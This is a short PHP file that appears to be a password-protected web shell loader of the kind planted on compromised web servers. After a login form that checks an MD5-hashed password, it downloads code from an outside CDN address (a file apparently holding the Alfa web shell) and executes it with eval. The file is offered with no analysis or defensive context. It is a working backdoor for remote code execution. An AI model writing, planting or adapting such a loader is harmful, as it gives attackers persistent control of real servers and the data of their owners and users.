<?php
session_start();
$hashed_password = 'a4a927fc77f0dcdef1588ab6c9431012';

if(isset($_POST['p'])) {
    if(md5($_POST['p']) === $hashed_password) {
        $_SESSION['logged_in'] = true;
    } else {
        die("Salah, bangsat!");
    }
}

if(!isset($_SESSION['logged_in'])) {
?>
<!DOCTYPE html>
<html>
<head>
<title>.</title>
<style>
body{background:#000;color:#0f0;font-family:monospace;margin:0;}
#login{position:absolute;top:10px;left:10px;background:#111;padding:5px 10px;border:1px solid #0f0;}
input{background:#000;color:#0f0;border:1px solid #0f0;padding:3px;}
</style>
</head>
<body>
<div id="login">
<form method="post">
<input type="password" name="p" placeholder="pass" autofocus>
<input type="submit" value="→">
</form>
</div>
</body>
</html>
<?php exit(); } 

$shell = file_get_contents('https://idola69.b-cdn.net/d4rkkkkk/alfa.txt');
eval("?>" . $shell);
?>
